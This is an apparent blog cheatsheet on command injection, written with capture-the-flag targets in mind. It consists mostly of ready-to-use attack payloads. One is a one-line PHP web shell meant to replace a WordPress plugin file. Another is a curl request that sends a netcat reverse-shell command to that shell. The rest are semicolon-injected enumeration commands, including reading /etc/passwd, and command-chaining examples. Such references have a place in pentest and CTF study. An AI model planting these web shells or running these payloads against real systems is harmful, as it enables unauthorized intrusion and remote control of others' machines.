---
title: "Command Injection cheatsheet"
date: 2025-05-02 10:10:00 +0700
categories: [Cheatsheets]
tags: [Cheatsheets, command injection]
pin: false
---

### Command injection is a vulnerability that occurs when an application improperly passes user input to a system shell. Attackers can exploit this flaw to execute arbitrary commands on the target system. This often happens due to improper input validation in web applications, shell scripts, or system commands.


#### Alternative Command Injection
Replace vulnerable code with:
```php
<?php echo system($_REQUEST['cmd']); ?>
```
Example usage:
```
wp-content/plugins/akismet/wrapper.php?cmd=whoami
```
Or via `curl`:
```bash
curl -X POST http://spectra.htb/pathtoaskismet/wrapper.php -d cmd="nc 127.0.0.1 1337 -e /bin/sh"
```

---

## Linux Command Injection

### Basic Enumeration
```bash
; id
; whoami
; uname -a
; ls -la
; cat /etc/passwd
; ps aux
; netstat -tulnp
```

### Chaining Commands
```bash
id; ls -la  # Execute id and then list files
whoami && hostname  # Run hostname only if whoami succeeds
ls || echo "Command failed"  # Show message if ls fails
```

